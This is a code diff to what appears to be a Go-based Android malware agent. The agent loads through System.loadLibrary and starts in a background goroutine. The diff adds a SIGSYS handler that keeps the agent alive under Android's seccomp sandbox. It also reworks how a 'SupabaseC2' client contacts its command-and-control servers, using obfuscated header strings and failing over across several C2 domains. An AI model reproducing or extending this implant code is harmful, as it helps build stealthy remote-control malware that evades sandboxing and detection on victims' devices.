@@ -4,6 +4,40 @@ package main
 // When Android loads this via System.loadLibrary("agent"),
 // Go's init() starts the agent in a background goroutine.
 
+// Seccomp SIGSYS trap: Android's seccomp sandbox blocks certain
+// syscalls (e.g. memfd_create on older devices). The kernel sends
+// SIGSYS which kills the process. This handler catches SIGSYS and
+// makes the blocked syscall return -ENOSYS so Go's runtime falls
+// back to alternatives (e.g. regular mmap instead of memfd_create).
+// The __attribute__((constructor)) ensures the handler is installed
+// before Go's runtime init makes any syscalls.
+
+// #include <signal.h>
+// #include <errno.h>
+// #include <string.h>
+// #include <stdint.h>
+//
+// static void _seccomp_trap(int sig, siginfo_t *si, void *ucp) {
+//     (void)sig; (void)si;
+// #if defined(__arm__)
+//     ((ucontext_t *)ucp)->uc_mcontext.arm_r0 = (unsigned long)(-ENOSYS);
+// #elif defined(__aarch64__)
+//     ((ucontext_t *)ucp)->uc_mcontext.regs[0] = (uint64_t)(-ENOSYS);
+// #elif defined(__i386__)
+//     ((ucontext_t *)ucp)->uc_mcontext.gregs[REG_EAX] = -ENOSYS;
+// #elif defined(__x86_64__)
+//     ((ucontext_t *)ucp)->uc_mcontext.gregs[REG_RAX] = -ENOSYS;
+// #endif
+// }
+//
+// __attribute__((constructor))
+// static void _init_seccomp_trap(void) {
+//     struct sigaction sa;
+//     memset(&sa, 0, sizeof(sa));
+//     sa.sa_sigaction = _seccomp_trap;
+//     sa.sa_flags = SA_SIGINFO | SA_NODEFER;
+//     sigaction(SIGSYS, &sa, NULL);
+// }
 import "C"
 
 import (
@@ -103,9 +137,9 @@ func (c *SupabaseC2) doRequest(method, path string, body io.Reader, extra map[st
 		if err != nil {
 			continue
 		}
-		// Use obfuscated headers like Windows agent
+		// Set Content-Type for requests with a body
 		if body != nil {
-			req.Header.Set(xd(encContentType), "application/json")
+			req.Header.Set("Content-Type", xd(encContentType))
 		}
 		req.Header.Set(xd(encAPIKey), c.apiKey)
 		req.Header.Set(xd(encAuth), xd(encBearer)+c.apiKey)
@@ -116,8 +150,17 @@ func (c *SupabaseC2) doRequest(method, path string, body io.Reader, extra map[st
 			req.Header.Set(k, v)
 		}
 		resp, err := c.client.Do(req)
-		if err == nil {
+		if err != nil {
+			continue
+		}
+		if resp.StatusCode >= 200 && resp.StatusCode < 300 {
 			return resp, nil
+		}
+		// Non-2xx: read body for error context, close, and try next domain
+		errBody, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		if len(c.domains) == 1 || domain == c.domains[len(c.domains)-1] {
+			return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, string(errBody))
 		}
 	}
 	return nil, fmt.Errorf("all C2 domains failed")
